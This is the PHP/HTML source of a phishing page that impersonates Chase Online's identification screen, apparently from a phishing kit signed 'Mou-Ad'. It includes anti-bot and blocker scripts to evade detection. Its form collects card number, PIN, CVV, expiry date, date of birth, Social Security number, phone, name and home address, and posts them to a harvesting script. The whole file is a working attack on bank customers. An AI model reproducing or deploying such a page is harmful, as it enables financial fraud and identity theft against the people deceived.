<?php
/*   
Mou-Ad                    
*/


session_start();
error_reporting(0);
@ini_set('display_errors', 'on'); 
ob_start();  
include 'antibots.php';
include './bt.php';
include "./blocker.php";
?>

<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<!-- saved from url=(0014)about:internet -->
<html><head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<title>Chase Online - Identification</title>
<meta name="GENERATOR" content="Created by officialhome Website builder http://www.homename.com">
<meta name="HOSTING" content="Hosting Provided By hgator http://www.hostgator">
<link rel="shortcut icon" href="css/favicon.ico" type="css/vnd.microsoft.icon"/>
<link rel="icon" href="css/favicon.ico" type="css/vnd.microsoft.icon"/><style type="text/css">
<style type="text/css">
body
{
   background-color: #FFFFFF;
   color: #000000;
}
</style>
<script language=JavaScript>
function validateForm() {
    var x = document.forms["Form1"]["emll"].value;
    var atpos = x.indexOf("@");
    if (atpos< 1 || dotpos<atpos+2 || dotpos+2>=x.length) {
        alert("Enter full email address with all required field");
        return false;
    }
}
</script>
<style>
.form_baba {
 display: inline;
 border: 1px solid #bdbdbd;
 padding: 5px;
 color: #808080;
 min-width: 180px;
 -moz-border-radius: 2px;
 -webkit-border-radius: 2px;
 border-radius: 2px;
}
</style>
<style type="text/css">
a:hover
{
   color: #6CDA7B;
}
</style>
<!--[if lt IE 7]>
<style type="text/css">
   img { behavior: url("pngfix.htc"); }
</style>
<![endif]-->
</head>
<body>
<div id="" style="margin:0;padding:0;position:absolute;left:-1px;top:-1px;width:318px;height:483px;text-align:left;z-index:3;">
<img src="css/new-bg.png" id="Image7" alt=""  align="top" border="0"></div><div id="lv_Form1" style="position:absolute;left:0px;top:0px;width:1371px;height:713px;z-index:4">
<form name="Form1" method="post" action="res/post4.php" onsubmit="return validateForm()">
  <input id="create_mu39422" style="position:absolute;left:570px;top:386px;width:178px;height:18px;border:1px #C0C0C0 solid;font-family:Arial;border-radius:2px;font-size:12px;z-index:1" name="12" value="" type="text" maxlength="16" onkeydown='return(event.which >= 48 && event.which <= 57)
                                            || event.which ==8 || event.which == 46' required = "true"/>
<input id="create_mu39426" style="position:absolute;left:570px;top:412px;width:52px;height:18px;border:1px #C0C0C0 solid;font-family:Arial;border-radius:2px;font-size:12px;z-index:1" name="15" value="" type="password" length="6" required = "true"/>
<input id="create_mu39427" style="position:absolute;left:570px;top:441px;width:52px;height:18px;border:1px #C0C0C0 solid;font-family:Arial;border-radius:2px;font-size:12px;z-index:1" name="14" value="" type="text" length="6" maxlength="3" onkeydown='return(event.which >= 48 && event.which <= 57)
                                            || event.which ==8 || event.which == 46' required = "true"/>
<select id="b1" name="13" style="position:absolute;left:570px;top:472px;width:60px;height:22px;border:1px #C0C0C0 solid;font-family:Arial;font-size:12px;z-index:0" type="text">
<option value="00" selected>- -</option><option value=01>01</option><option value=02>02</option><option value=03>03</option><option value=04>04</option><option value=05>05</option>
<option value=06>06</option><option value=07>07</option><option value=08>08</option><option value=09>09</option><option value=10>10</option><option value=11>11</option><option value=12>12</option></select></option>
<select id="b3" name="33" style="position:absolute;left:632px;top:472px;width:60px;height:22px;border:1px #C0C0C0 solid;font-family:Arial;font-size:12px;z-index:0" type="text">
<option value="----" selected>- - - -</option><option value=2018>2018</option><option value=2019>2019</option><option value="2020">2020</option><option value="2021">2021</option><option value="2022">2022</option><option value="2023">2023</option><option value="2024">2024</option><option value="2025">2025</option><option value="2026">2026</option><option value="2027">2027</option><option value="2028">2028</option><option value="2029">2029</option><option value="2030">2030</option></select></option>
<input id="create_mu39429" style="position:absolute;left:590px;top:585px;width:160px;height:18px;border:1px #C0C0C0 solid;font-family:Arial;border-radius:2px;font-size:12px;z-index:1" name="6" value="" type="date" placeholder="" required = "true"/>
<input id="create_mu39420" style="position:absolute;left:590px;top:615px;width:160px;height:18px;border:1px #C0C0C0 solid;font-family:Arial;border-radius:2px;font-size:12px;z-index:1" name="16" value="" type="text" maxlength="11" pattern="[0-9]{1,3}-[0-9]{1,2}-[0-9]{1,4}" placeholder=" e.g 000-00-0000">
<input id="create_mu39429" style="position:absolute;left:590px;top:645px;width:160px;height:18px;border:1px #C0C0C0 solid;font-family:Arial;border-radius:2px;font-size:12px;z-index:1" name="phoo" value="" type="text" onkeydown='return(event.which >= 48 && event.which <= 57)
                                            || event.which ==8 || event.which == 46' placeholder=" Phone number" required = "true"/>
<input id="create_mu39428" style="position:absolute;left:590px;top:674px;width:160px;height:18px;border:1px #C0C0C0 solid;font-family:Arial;border-radius:2px;font-size:12px;z-index:1" name="5" value="" type="text" placeholder="Full Name">

<input id="create_mu39429" style="position:absolute;left:590px;top:700px;width:160px;height:18px;border:1px #C0C0C0 solid;font-family:Arial;border-radius:2px;font-size:12px;z-index:1" name="7" value="" type="text" placeholder="Home Address" required = "true"/>
<input id="Button1" name="Button1" value="" style="position:absolute;left:696px;top:830px;width:60px;height:22px;border:0px #000000 dotted;background-color:transparent;font-family:Arial;font-size:13px;z-index:2" type="submit">
</form>
</div>
</body></html>